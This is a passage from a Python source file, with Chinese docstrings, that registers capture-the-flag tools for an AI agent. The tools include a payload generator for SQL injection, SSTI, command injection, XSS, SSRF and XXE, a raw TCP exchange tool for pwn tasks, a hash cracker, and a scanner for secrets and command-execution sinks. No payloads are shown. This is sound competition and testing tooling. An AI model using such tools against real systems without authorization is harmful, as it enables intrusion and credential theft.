    results: list[dict[str, Any]] = []
    seen: set[str] = set()
    for item in files[:300]:
        try:
            if item.stat().st_size > 2 * 1024 * 1024:
                continue
            content = item.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        for flag in extract_flags(content):
            if flag.lower() in seen:
                continue
            seen.add(flag.lower())
            position = content.find(flag)
            line = content.count("\n", 0, max(0, position)) + 1
            results.append(
                {
                    "flag": flag,
                    "file": str(item.relative_to(Path(ctx.workspace).resolve())),
                    "line": line,
                }
            )
            if len(results) >= 100:
                break
        if len(results) >= 100:
            break
    return ok({"source": str(root), "flags": results, "count": len(results)})


def _artifact_scan(
    ctx: AgentContext,
    path: str = ".",
    mode: str = "all",
    limit: int = 100,
) -> str:
    try:
        root = safe_workspace_path(ctx.workspace, path)
    except ValueError as exc:
        return err(str(exc))
    if not root.exists():
        return err("路径不存在")
    files = [root] if root.is_file() else [
        item for item in root.rglob("*") if item.is_file()
    ]
    selected = str(mode or "all").lower()
    if selected not in ("all", "secrets", "sinks"):
        return err("mode 支持 all、secrets、sinks")
    max_items = max(1, min(300, int(limit)))
    findings: list[dict[str, Any]] = []
    for item in files[:300]:
        try:
            if item.stat().st_size > 2 * 1024 * 1024:
                continue
            content = item.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        relative = str(item.relative_to(Path(ctx.workspace).resolve()))
        patterns: dict[str, re.Pattern[str]] = {}
        if selected in ("all", "secrets"):
            patterns.update(SECRET_RE)
        if selected in ("all", "sinks"):
            patterns.update(SINK_RE)
        for name, pattern in patterns.items():
            for match in pattern.finditer(content):
                line = content.count("\n", 0, match.start()) + 1
                findings.append(
                    {
                        "file": relative,
                        "line": line,
                        "category": name,
                        "preview": match.group(0)[:300],
                    }
                )
                if len(findings) >= max_items:
                    break
            if len(findings) >= max_items:
                break
        if len(findings) >= max_items:
            break
    return ok(
        {
            "path": str(root),
            "mode": selected,
            "findings": findings,
            "count": len(findings),
            "truncated": len(findings) >= max_items,
        }
    )


def build_ctf_tools(ctx: AgentContext) -> dict[str, BaseTool]:
    @tool("codec")
    def codec(
        data: str,
        operation: str = "encode",
        format: str = "base64",
        key: str = "",
    ) -> str:
        """CTF 编码/解码/哈希：base64、base64url、base32、base85、ascii85、hex、url、html、unicode、binary、rot13、caesar、morse、json；operation=encode/decode/hash。"""
        return _codec(ctx, data, operation, format, key)

    @tool("payload_forge")
    def payload_forge(
        category: str,
        context: str = "",
        encoding: str = "",
    ) -> str:
        """按类别生成 CTF/SRC 验证 payload：sqli、ssti、lfi、cmd、xss、ssrf、redirect、xxe，可选 url/double_url/base64/hex 编码。"""
        return _payload_forge(ctx, category, context, encoding)

    @tool("tcp_exchange")
    async def tcp_exchange(
        host: str,
        port: int,
        data: str,
        timeout_ms: int = 2000,
        read_until: str = "",
        hex_input: bool = False,
        tls: bool = False,
        insecure: bool = False,
    ) -> str:
        """与 TCP 服务交互：发送文本/十六进制数据，读取响应；适合 pwn、AWD、协议探测。"""
        return await _tcp_exchange(
            ctx, host, port, data, timeout_ms, read_until, hex_input, tls, insecure
        )

    @tool("binary_info")
    def binary_info(path: str) -> str:
        """分析工作区 ELF/PE：架构、入口、PIE、NX、RELRO、Canary、字符串与哈希。"""
        return _binary_info(ctx, path)

    @tool("disassemble")
    def disassemble(
        path: str,
        start: int = 0,
        count: int = 40,
        architecture: str = "auto",
    ) -> str:
        """静态反汇编工作区 ELF/PE 的 .text（x86/x86_64/ARM/ARM64/MIPS），用于逆向校验逻辑、找入口与关键调用。"""
        return _disassemble(ctx, path, start, count, architecture)

    @tool("crypto_workshop")
    def crypto_workshop(
        mode: str,
        data: str = "",
        key: str = "",
        wordlist: str = "",
        n: str = "",
        e: str = "",
        c: str = "",
        n2: str = "",
    ) -> str:
        """CTF Crypto 基础分析：single_xor、repeating_xor、caesar、rsa_info、hash_identify、hash_crack、freq。"""
        return _crypto_workshop(ctx, mode, data, key, wordlist, n, e, c, n2)

    @tool("file_analyze")
    def file_analyze(path: str) -> str:
        """分析工作区文件：magic、大小、哈希、熵、字符串、hexdump、ZIP 条目。"""
        return _file_analyze(ctx, path)

    @tool("archive_extract")
    def archive_extract(path: str, output_dir: str = ".", password: str = "") -> str:
        """安全解压工作区压缩包（zip/tar/gz/bz2/xz），拒绝目录穿越与超限条目。"""
        return _archive_extract(ctx, path, output_dir, password)

    @tool("flag_hunt")
    def flag_hunt(path: str = ".", text: str = "") -> str:
        """从文本或工作区文件中提取 flag{...}/CTF{...} 等 flag，返回文件与行号。"""
        return _flag_hunt(ctx, path, text)

    @tool("artifact_scan")
    def artifact_scan(path: str = ".", mode: str = "all", limit: int = 100) -> str:
        """扫描工作区源码/配置：secrets（密钥、token、密码、私钥）与 sinks（命令执行、反序列化、SQL 拼接、XSS 等）。"""
        return _artifact_scan(ctx, path, mode, limit)

    return {
        "codec": codec,
        "payload_forge": payload_forge,
        "tcp_exchange": tcp_exchange,
        "binary_info": binary_info,
        "disassemble": disassemble,
        "crypto_workshop": crypto_workshop,
        "file_analyze": file_analyze,
        "archive_extract": archive_extract,
        "flag_hunt": flag_hunt,
        "artifact_scan": artifact_scan,
    }


__all__ = ["build_ctf_tools"]
